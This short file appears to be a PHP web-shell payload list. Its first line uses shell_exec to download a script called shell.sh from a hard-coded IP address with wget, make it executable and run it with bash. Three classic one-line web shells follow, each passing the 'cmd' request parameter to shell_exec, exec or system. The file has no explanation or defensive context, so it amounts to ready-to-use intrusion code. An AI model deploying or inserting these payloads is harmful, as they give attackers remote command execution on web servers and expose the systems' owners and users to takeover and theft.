<?php echo shell_exec("wget http://192.168.45.231:80/shell.sh -O /tmp/shell.sh;chmod 700 /tmp/shell.sh; bash -c /tmp/shell.sh") ?>

// Variation of the classic
<?php echo shell_exec($_GET['cmd']) ?>
<?php echo exec($_GET['cmd']) ?>
<?php echo system($_GET['cmd']) ?>
